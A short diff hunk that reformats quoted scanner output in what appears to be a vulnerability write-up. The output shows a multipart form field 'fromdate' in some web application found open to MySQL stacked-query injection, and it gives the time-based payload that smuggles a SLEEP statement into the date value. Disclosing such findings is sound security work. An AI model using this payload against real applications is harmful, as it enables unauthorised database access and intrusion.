@@ -53,7 +53,8 @@
 ```
 Parameter: MULTIPART #1* ((custom) POST)
     Type: stacked queries
-    Title: MySQL >= 5.0.12 stacked queries (comment)                                        Payload: ------WebKitFormBoundary8VPUBCcI7nhUUX8y
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: ------WebKitFormBoundary8VPUBCcI7nhUUX8y
 Content-Disposition: form-data; name="fromdate"
 2025-09-04';SELECT SLEEP(5)#                                          
 ------WebKitFormBoundary8VPUBCcI7nhUUX8y
